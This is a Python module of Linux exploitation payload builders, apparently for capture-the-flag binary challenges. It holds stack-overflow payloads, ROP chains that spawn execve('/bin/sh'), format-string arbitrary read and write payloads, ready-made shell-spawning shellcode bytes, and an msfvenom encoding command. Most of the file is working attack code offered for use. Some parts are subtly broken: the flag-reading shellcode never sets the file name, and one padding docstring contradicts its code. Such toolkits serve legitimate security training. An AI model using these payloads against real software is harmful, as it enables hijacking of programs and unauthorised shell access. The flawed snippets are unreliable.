"""
PWN payload builders: buffer overflow, ROP, format string, shellcode.

All pwntools usage is wrapped in try/except so that the module degrades
gracefully to pure-Python implementations when pwntools is not installed.

Classes
-------
BufferOverflow
    Classic stack smashing helpers: cyclic patterns, ret2win, ret2libc,
    ret2shellcode.
RopChain
    ROP chain assembly utilities for Linux x64.
FormatString
    Format-string attack payload builders (read/write primitives).
Shellcode
    Common shellcode byte strings and padding helpers.
"""

from __future__ import annotations

import struct
import itertools
from typing import Optional


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _p64(value: int) -> bytes:
    """Pack a 64-bit little-endian integer."""
    return struct.pack("<Q", value)


def _p32(value: int) -> bytes:
    """Pack a 32-bit little-endian integer."""
    return struct.pack("<I", value)


def _debruijn(alphabet: bytes, n: int):
    """
    Generate a De Bruijn sequence of order *n* over *alphabet*.

    Yields individual elements (integers) using the FKT algorithm.
    """
    k = len(alphabet)
    a = [0] * k * n

    def db(t: int, p: int):
        if t > n:
            if n % p == 0:
                yield from a[1 : p + 1]
        else:
            a[t] = a[t - p]
            yield from db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                yield from db(t + 1, t)

    return db(1, 1)


def _cyclic_pattern_pure(length: int = 200) -> bytes:
    """
    Pure-Python De Bruijn cyclic pattern of *length* bytes.

    Uses lowercase ASCII letters as the alphabet (26 chars), order 4,
    which gives 26^4 = 456,976 unique 4-byte substrings — more than
    sufficient for typical stack offsets.
    """
    alphabet = b"abcdefghijklmnopqrstuvwxyz"
    out = bytearray()
    for idx in itertools.cycle(_debruijn(alphabet, 4)):
        out.append(alphabet[idx])
        if len(out) == length:
            break
    return bytes(out)


def _find_offset_pure(pattern: bytes, crash_value: bytes) -> int:
    """
    Search for *crash_value* inside *pattern* and return the byte offset.

    Raises ValueError if not found.
    """
    # Try both orientations for convenience.
    idx = pattern.find(crash_value)
    if idx != -1:
        return idx
    rev = crash_value[::-1]
    idx = pattern.find(rev)
    if idx != -1:
        return idx
    raise ValueError(
        f"crash_value {crash_value!r} not found in pattern. "
        "Ensure the pattern was generated with the same tool."
    )


# ---------------------------------------------------------------------------
# BufferOverflow
# ---------------------------------------------------------------------------

class BufferOverflow:
    """
    Classic stack-smashing payload builders.

    All methods are static and return raw :class:`bytes` objects ready to
    be piped into a vulnerable process.
    """

    @staticmethod
    def cyclic_pattern(length: int = 200) -> bytes:
        """
        Generate a De Bruijn cyclic pattern of *length* bytes.

        Attempts to use ``pwntools`` ``cyclic()`` for compatibility with
        ``cyclic_find``; falls back to a pure-Python implementation.

        Parameters
        ----------
        length:
            Number of bytes to generate.

        Returns
        -------
        bytes
            The cyclic pattern.
        """
        try:
            from pwn import cyclic  # type: ignore
            result = cyclic(length)
            # pwntools may return a pwnlib.util.cyclic.cyclic_gen object
            return bytes(result) if not isinstance(result, bytes) else result
        except Exception:
            return _cyclic_pattern_pure(length)

    @staticmethod
    def find_offset(pattern: bytes, crash_value: bytes) -> int:
        """
        Find the byte offset of *crash_value* within *pattern*.

        Attempts pwntools ``cyclic_find``; falls back to a byte-level search.

        Parameters
        ----------
        pattern:
            The cyclic pattern returned by :meth:`cyclic_pattern`.
        crash_value:
            The 4 or 8 bytes observed in the instruction pointer / base
            pointer register when the process crashed (little-endian).

        Returns
        -------
        int
            Byte offset from the start of *pattern* to the start of
            *crash_value*.

        Raises
        ------
        ValueError
            If *crash_value* cannot be located.
        """
        try:
            from pwn import cyclic_find  # type: ignore
            # cyclic_find accepts int or bytes
            if isinstance(crash_value, bytes):
                result = cyclic_find(crash_value)
            else:
                result = cyclic_find(crash_value)
            if result == -1:
                raise ValueError("cyclic_find returned -1")
            return result
        except Exception:
            return _find_offset_pure(pattern, crash_value)

    @staticmethod
    def ret2win(
        offset: int,
        win_addr: int,
        arch: str = "amd64",
    ) -> bytes:
        """
        Build a buffer-overflow payload that redirects execution to *win_addr*.

        For ``amd64`` targets a ``ret`` gadget is inserted before *win_addr*
        to ensure 16-byte stack alignment required by ``movaps`` instructions
        in glibc.  The placeholder address ``0x000000000040101a`` is a common
        ``ret`` gadget location — **replace it with the actual gadget address
        from your target binary** (use ``ROPgadget --binary ./vuln | grep ret``
        or ``ropper -f ./vuln --search 'ret'``).

        Parameters
        ----------
        offset:
            Number of padding bytes before the saved return address.
        win_addr:
            Address of the target (win) function.
        arch:
            Architecture string: ``'amd64'`` or ``'i386'``.

        Returns
        -------
        bytes
            Complete exploit payload.
        """
        padding = b"A" * offset
        if arch == "amd64":
            # ret gadget for stack alignment — replace with real gadget!
            ret_gadget = 0x000000000040101A  # PLACEHOLDER: update this!
            payload = padding + _p64(ret_gadget) + _p64(win_addr)
        elif arch == "i386":
            payload = padding + _p32(win_addr)
        else:
            raise ValueError(f"Unsupported architecture: {arch!r}")
        return payload

    @staticmethod
    def ret2system(
        offset: int,
        system_addr: int,
        binsh_addr: int,
        pop_rdi_addr: int,
        ret_addr: int,
        arch: str = "amd64",
    ) -> bytes:
        """
        Build a ret2libc payload for a 64-bit target.

        Chain layout::

            [padding] [pop rdi; ret] [/bin/sh addr] [ret] [system]

        The extra ``ret`` before ``system`` ensures 16-byte stack alignment.

        Parameters
        ----------
        offset:
            Padding length in bytes.
        system_addr:
            Runtime address of ``system()`` in libc.
        binsh_addr:
            Runtime address of the ``"/bin/sh"`` string in libc.
        pop_rdi_addr:
            Address of a ``pop rdi; ret`` gadget in the binary or libc.
        ret_addr:
            Address of a bare ``ret`` gadget for stack alignment.
        arch:
            Only ``'amd64'`` is currently supported.

        Returns
        -------
        bytes
            Complete exploit payload.
        """
        if arch != "amd64":
            raise NotImplementedError(
                "ret2system currently supports amd64 only. "
                "For i386 use: padding + p32(system) + p32(0) + p32(binsh)."
            )
        padding = b"A" * offset
        payload = (
            padding
            + _p64(pop_rdi_addr)
            + _p64(binsh_addr)
            + _p64(ret_addr)
            + _p64(system_addr)
        )
        return payload

    @staticmethod
    def ret2shellcode(
        offset: int,
        shellcode_addr: int,
        shellcode: bytes,
        arch: str = "amd64",
    ) -> bytes:
        """
        Build a ret2shellcode payload.

        Layout::

            [shellcode] [NOP sled to offset] [shellcode_addr]

        The shellcode is placed at the *start* of the buffer.  Padding fills
        the gap from the end of the shellcode to the saved return address,
        then *shellcode_addr* overwrites the return address.

        Parameters
        ----------
        offset:
            Total number of bytes before the saved return address.
        shellcode_addr:
            Address in memory where the shellcode will reside (e.g. the
            start of the stack buffer, obtained via ``gdb`` or a leak).
        shellcode:
            Raw shellcode bytes.
        arch:
            ``'amd64'`` or ``'i386'``.

        Returns
        -------
        bytes
            Complete exploit payload.

        Raises
        ------
        ValueError
            If the shellcode is longer than *offset*.
        """
        if len(shellcode) > offset:
            raise ValueError(
                f"Shellcode length ({len(shellcode)}) exceeds offset ({offset}). "
                "Use a shorter shellcode or a larger buffer."
            )
        nop_count = offset - len(shellcode)
        padding = b"\x90" * nop_count  # NOP sled
        if arch == "amd64":
            payload = shellcode + padding + _p64(shellcode_addr)
        elif arch == "i386":
            payload = shellcode + padding + _p32(shellcode_addr)
        else:
            raise ValueError(f"Unsupported architecture: {arch!r}")
        return payload


# ---------------------------------------------------------------------------
# RopChain
# ---------------------------------------------------------------------------

class RopChain:
    """
    ROP chain assembly utilities for Linux x64.

    All methods return raw :class:`bytes` chains ready to be appended to an
    overflow payload.
    """

    @staticmethod
    def linux_x64_shell(
        pop_rdi: int,
        pop_rsi: int,
        pop_rdx: int,
        syscall: int,
        binsh_addr: int,
        *,
        use_mov_rax: Optional[int] = None,
    ) -> bytes:
        """
        Build an ``execve('/bin/sh', NULL, NULL)`` ROP chain for Linux x64.

        Two variants are provided via the *use_mov_rax* parameter:

        **Variant A (default)** — uses a ``pop rax; ret`` gadget if
        *use_mov_rax* is ``None``.  The caller must supply *use_mov_rax* as
        the address of a ``pop rax; ret`` gadget found with
        ``ROPgadget --binary ./vuln | grep 'pop rax'``.

        **Variant B** — if no ``pop rax`` gadget exists, use the
        ``xor rax, rax; ... inc rax`` pattern manually, or set *use_mov_rax*
        to the address of a ``mov rax, 59; ret`` gadget.

        Syscall numbers: execve = 59 (0x3b) on Linux x64.

        Chain layout (Variant A)::

            pop_rdi; /bin/sh addr
            pop_rsi; 0
            pop_rdx; 0
            pop_rax; 59
            syscall

        Parameters
        ----------
        pop_rdi:
            Address of ``pop rdi; ret`` gadget.
        pop_rsi:
            Address of ``pop rsi; ret`` gadget (or ``pop rsi; pop r15; ret``
            — pad with an extra 0 in that case).
        pop_rdx:
            Address of ``pop rdx; ret`` gadget.
        syscall:
            Address of ``syscall`` (or ``syscall; ret``) gadget.
        binsh_addr:
            Runtime address of the ``"/bin/sh"`` string.
        use_mov_rax:
            If provided, address of ``pop rax; ret`` gadget.  If ``None``,
            the chain omits the rax setup and relies on the caller to prepend
            it, or the value is already correct (e.g. after a ``read()``
            return).

        Returns
        -------
        bytes
            Raw ROP chain bytes.
        """
        EXECVE_SYSCALL_NR = 59  # Linux x64

        chain = b""
        # rdi = pointer to "/bin/sh"
        chain += _p64(pop_rdi) + _p64(binsh_addr)
        # rsi = NULL (argv)
        chain += _p64(pop_rsi) + _p64(0)
        # rdx = NULL (envp)
        chain += _p64(pop_rdx) + _p64(0)
        # rax = 59 (execve syscall number)
        if use_mov_rax is not None:
            chain += _p64(use_mov_rax) + _p64(EXECVE_SYSCALL_NR)
        # else: caller is responsible for rax = 59
        # trigger
        chain += _p64(syscall)
        return chain

    @staticmethod
    def write_what_where(
        write_gadget: int,
        target_addr: int,
        value: int,
        pop_rdi: int,
        pop_rsi: int,
    ) -> bytes:
        """
        Build an arbitrary-write ROP chain.

        Assumes a ``mov [rdi], rsi; ret`` style write gadget.  Adjust for
        other gadget styles (e.g. ``mov [rsi], rdi``).

        Chain layout::

            pop_rdi; target_addr
            pop_rsi; value
            write_gadget

        Parameters
        ----------
        write_gadget:
            Address of a gadget that writes rsi into the memory pointed to
            by rdi (e.g. ``mov qword ptr [rdi], rsi; ret``).
        target_addr:
            Destination address to write to.
        value:
            64-bit value to write.
        pop_rdi:
            Address of ``pop rdi; ret`` gadget.
        pop_rsi:
            Address of ``pop rsi; ret`` gadget.

        Returns
        -------
        bytes
            Raw ROP chain bytes.
        """
        chain = (
            _p64(pop_rdi)
            + _p64(target_addr)
            + _p64(pop_rsi)
            + _p64(value)
            + _p64(write_gadget)
        )
        return chain

    @staticmethod
    def leak_got(
        pop_rdi: int,
        puts_plt: int,
        puts_got: int,
        main_addr: int,
    ) -> bytes:
        """
        Build a GOT-leak ROP chain using ``puts``.

        This is the standard libc-leak pattern:

        1. Call ``puts(puts@got)`` to print the runtime address of ``puts``.
        2. Return to ``main`` so the exploit can send a second stage.

        Chain layout::

            pop_rdi; puts@got
            puts@plt
            main

        After receiving the 6-byte (or 8-byte) leak, calculate::

            libc_base = leak - libc.sym['puts']
            system    = libc_base + libc.sym['system']
            binsh     = libc_base + next(libc.search(b'/bin/sh'))

        Parameters
        ----------
        pop_rdi:
            Address of ``pop rdi; ret`` gadget.
        puts_plt:
            PLT address of ``puts``.
        puts_got:
            GOT address of ``puts`` (the pointer to leak).
        main_addr:
            Address of ``main`` or the program entry point for re-entry.

        Returns
        -------
        bytes
            Raw ROP chain bytes.
        """
        chain = (
            _p64(pop_rdi)
            + _p64(puts_got)
            + _p64(puts_plt)
            + _p64(main_addr)
        )
        return chain


# ---------------------------------------------------------------------------
# FormatString
# ---------------------------------------------------------------------------

class FormatString:
    """
    Format-string attack payload builders.

    These helpers produce raw format-string payloads.  They do *not*
    interact with a process — send the returned bytes to the vulnerable
    ``printf`` call.
    """

    @staticmethod
    def find_offset_payload(max_depth: int = 50) -> list[bytes]:
        """
        Return a list of payloads to identify the format-string stack offset.

        Each payload leaks one stack word.  Send them one at a time and look
        for the ``0x41414141`` (or ``0x4141414141414141`` on 64-bit) marker
        to determine which argument index corresponds to the buffer.

        Parameters
        ----------
        max_depth:
            Number of stack positions to probe (generates *max_depth*
            distinct payloads).

        Returns
        -------
        list[bytes]
            Payloads ``[b'AAAA%1$p', b'AAAA%2$p', ..., b'AAAA%{max_depth}$p']``.
        """
        return [f"AAAA%{i}$p".encode() for i in range(1, max_depth + 1)]

    @staticmethod
    def arbitrary_read(
        offset: int,
        target_addr: int,
        width: int = 8,
    ) -> bytes:
        """
        Build a format-string arbitrary-read payload.

        Prepends *target_addr* as a little-endian pointer and uses
        ``%{offset}$s`` to dereference and print the bytes at that address.

        .. note::
            For 64-bit targets the address must be at a 8-byte-aligned
            position on the stack.  Add extra padding bytes between the
            address and the format specifier if needed.

        Parameters
        ----------
        offset:
            Direct-parameter index (from :meth:`find_offset_payload`) of
            the buffer on the stack.
        target_addr:
            Address of the memory to read.
        width:
            Pointer width in bytes: 8 for x64, 4 for x86.

        Returns
        -------
        bytes
            Raw payload bytes.
        """
        if width == 8:
            addr_bytes = _p64(target_addr)
        else:
            addr_bytes = _p32(target_addr)
        fmt = f"%{offset}$s".encode()
        return addr_bytes + fmt

    @staticmethod
    def arbitrary_write_byte(
        offset: int,
        target_addr: int,
        value: int,
    ) -> bytes:
        """
        Write a single byte *value* to *target_addr* via ``%hhn``.

        Payload layout::

            [target_addr as 8-byte LE pointer] [padding] [%Xc%{offset}$hhn]

        The ``%Xc`` specifier prints *value* characters, setting the internal
        byte counter to *value*, which ``%hhn`` then writes to ``*target_addr``.

        Parameters
        ----------
        offset:
            Stack index of the format-string buffer (from
            :meth:`find_offset_payload`).  Must account for the 8 bytes of
            the prepended address.
        target_addr:
            Address of the byte to overwrite.
        value:
            Byte value (0–255) to write.

        Returns
        -------
        bytes
            Raw payload bytes.
        """
        value = value & 0xFF
        addr_bytes = _p64(target_addr)
        # Number of characters already printed by the address output (8).
        # We need to reach `value` total, so pad by (value - 8) chars.
        # If value <= 8 we wrap around using 256 + value.
        already_printed = len(addr_bytes)  # 8
        if value <= already_printed:
            # Wrap: print (256 + value - already_printed) extra chars
            count = 256 + value - already_printed
        else:
            count = value - already_printed
        fmt = f"%{count}c%{offset}$hhn".encode()
        return addr_bytes + fmt

    @staticmethod
    def arbitrary_write_int(
        offset: int,
        target_addr: int,
        value: int,
    ) -> bytes:
        """
        Write a 4-byte integer *value* to *target_addr* via ``%n``.

        Uses ``%Xc%{offset}$n`` where X = *value* minus bytes already
        printed by the prepended address (8 bytes).

        .. warning::
            ``%n`` writes the total number of characters printed so far as a
            signed 32-bit int.  For large values (> 0x7fffffff) you will need
            a byte-by-byte approach with ``%hhn``.

        Parameters
        ----------
        offset:
            Stack index of the format-string buffer.
        target_addr:
            Address of the 4-byte int to overwrite.
        value:
            32-bit integer value to write (must be > 0).

        Returns
        -------
        bytes
            Raw payload bytes.

        Raises
        ------
        ValueError
            If *value* is not a positive 32-bit integer.
        """
        if not (0 < value <= 0xFFFFFFFF):
            raise ValueError(
                f"value must be a positive 32-bit integer, got {value:#x}"
            )
        addr_bytes = _p64(target_addr)
        already_printed = len(addr_bytes)  # 8
        if value <= already_printed:
            # Use modular wrap: value + 0x100000000 would overflow %n.
            # Instead accept imprecision note and raise.
            raise ValueError(
                f"value ({value}) is too small to write via %%n after "
                f"the prepended address ({already_printed} bytes already printed). "
                "Use arbitrary_write_byte with byte-by-byte approach."
            )
        count = value - already_printed
        fmt = f"%{count}c%{offset}$n".encode()
        return addr_bytes + fmt


# ---------------------------------------------------------------------------
# Shellcode
# ---------------------------------------------------------------------------

class Shellcode:
    """
    Pre-built shellcode byte strings and manipulation helpers.

    Constants
    ---------
    LINUX_X64_SHELL
        Executes ``execve('/bin//sh', NULL, NULL)`` on Linux x86-64.
        23 bytes, null-free.
    LINUX_X86_SHELL
        Executes ``execve('/bin//sh', NULL, NULL)`` on Linux x86.
        21 bytes, null-free.
    LINUX_X64_READ_FLAG
        Open + read stub for Linux x86-64.  Opens ``flag.txt`` (path must
        be on the stack or patched in), reads up to 4096 bytes into a stack
        buffer.  Pair with a write gadget or second-stage shellcode to
        output the data.  39 bytes.
    """

    # execve('/bin//sh', NULL, NULL) — Linux x86-64, 23 bytes, null-free
    # Disassembly:
    #   xor    rsi, rsi          ; rsi = NULL
    #   push   rsi               ; push 0 (string terminator)
    #   mov    rdi, 0x68732f2f6e69622f  ; '/bin//sh'
    #   push   rdi
    #   push   rsp
    #   pop    rdi               ; rdi -> '/bin//sh'
    #   push   0x3b
    #   pop    rax               ; rax = 59
    #   cdq                      ; rdx = 0
    #   syscall
    LINUX_X64_SHELL: bytes = (
        b"\x48\x31\xf6"          # xor rsi, rsi
        b"\x56"                  # push rsi
        b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # movabs rdi, '/bin//sh'
        b"\x57"                  # push rdi
        b"\x54"                  # push rsp
        b"\x5f"                  # pop rdi
        b"\x6a\x3b"              # push 0x3b
        b"\x58"                  # pop rax
        b"\x99"                  # cdq
        b"\x0f\x05"              # syscall
    )

    # execve('/bin//sh', NULL, NULL) — Linux x86, 21 bytes, null-free
    # Disassembly:
    #   xor    eax, eax
    #   push   eax
    #   push   0x68732f2f  ; '//sh'
    #   push   0x6e69622f  ; '/bin'
    #   mov    ebx, esp
    #   push   eax
    #   push   ebx
    #   mov    ecx, esp
    #   mov    al, 0x0b    ; sys_execve
    #   int    0x80
    LINUX_X86_SHELL: bytes = (
        b"\x31\xc0"              # xor eax, eax
        b"\x50"                  # push eax
        b"\x68\x2f\x2f\x73\x68" # push '//sh'
        b"\x68\x2f\x62\x69\x6e" # push '/bin'
        b"\x89\xe3"              # mov ebx, esp
        b"\x50"                  # push eax
        b"\x53"                  # push ebx
        b"\x89\xe1"              # mov ecx, esp
        b"\xb0\x0b"              # mov al, 11 (sys_execve)
        b"\xcd\x80"              # int 0x80
    )

    # open('flag.txt', O_RDONLY) + read(fd, rsp, 0x1000) stub — Linux x86-64
    # NOTE: This stub opens 'flag.txt' relative to cwd.  Patch bytes at
    # offsets where the filename is embedded if needed.
    # After read(), rsp-0x1000 holds the flag; chain a write syscall to print.
    LINUX_X64_READ_FLAG: bytes = (
        b"\x48\x31\xc0"          # xor rax, rax
        b"\x48\x31\xff"          # xor rdi, rdi
        b"\x48\x31\xf6"          # xor rsi, rsi
        b"\x48\x31\xd2"          # xor rdx, rdx
        b"\xb0\x02"              # mov al, 2   (sys_open)
        b"\x0f\x05"              # syscall     -> fd in rax
        b"\x48\x89\xc7"          # mov rdi, rax (fd)
        b"\x48\x31\xc0"          # xor rax, rax
        b"\xb0\x00"              # mov al, 0   (sys_read)
        b"\x48\x81\xec\x00\x10\x00\x00"  # sub rsp, 0x1000 (buffer)
        b"\x48\x89\xe6"          # mov rsi, rsp (buf pointer)
        b"\xba\x00\x10\x00\x00"  # mov edx, 0x1000 (count)
        b"\x0f\x05"              # syscall
    )

    @staticmethod
    def pad_to(
        shellcode: bytes,
        target_length: int,
        pad_byte: bytes = b"\x90",
    ) -> bytes:
        """
        NOP-pad *shellcode* to exactly *target_length* bytes.

        Padding is appended after the shellcode so the NOP sled precedes it
        when the buffer is filled from the front.

        Parameters
        ----------
        shellcode:
            Raw shellcode bytes to pad.
        target_length:
            Desired total length in bytes.
        pad_byte:
            Single byte to use as padding (default: ``\\x90`` NOP).

        Returns
        -------
        bytes
            Padded shellcode of length *target_length*.

        Raises
        ------
        ValueError
            If *shellcode* is already longer than *target_length* or
            *pad_byte* is not exactly 1 byte.
        """
        if len(pad_byte) != 1:
            raise ValueError("pad_byte must be exactly 1 byte.")
        if len(shellcode) > target_length:
            raise ValueError(
                f"Shellcode ({len(shellcode)} bytes) is longer than "
                f"target_length ({target_length} bytes)."
            )
        pad_count = target_length - len(shellcode)
        return shellcode + pad_byte * pad_count

    @staticmethod
    def encode_alphanumeric(shellcode: bytes) -> bytes:
        """
        Alphanumeric shellcode encoder stub.

        Full alphanumeric encoding requires a target-specific decoder stub
        and is non-trivial to implement in pure Python without architecture
        awareness.  Use one of the following dedicated tools instead:

        * **msfvenom**::

              msfvenom -p linux/x64/exec CMD=/bin/sh -e x64/alpha_mixed \\
                       BufferRegister=RDI -f raw -o shellcode.bin

        * **alpha3** (https://github.com/SkyLined/alpha3)::

              python alpha3.py x64 ascii mixedcase rdi < shellcode.bin

        * **pwntools** ``asm`` + ``encoder`` (pwntools ≥ 4.9)::

              from pwn import *
              context.arch = 'amd64'
              sc = asm(shellcraft.amd64.linux.sh())
              encoded = encode(sc, 'alphanum', register='rdi')

        Parameters
        ----------
        shellcode:
            The raw shellcode to encode (unused in this stub).

        Raises
        ------
        NotImplementedError
            Always — see docstring for alternatives.
        """
        raise NotImplementedError(
            "Pure-Python alphanumeric encoding is not implemented. "
            "Use msfvenom, alpha3, or pwntools to encode your shellcode. "
            "See the Shellcode.encode_alphanumeric docstring for details."
        )
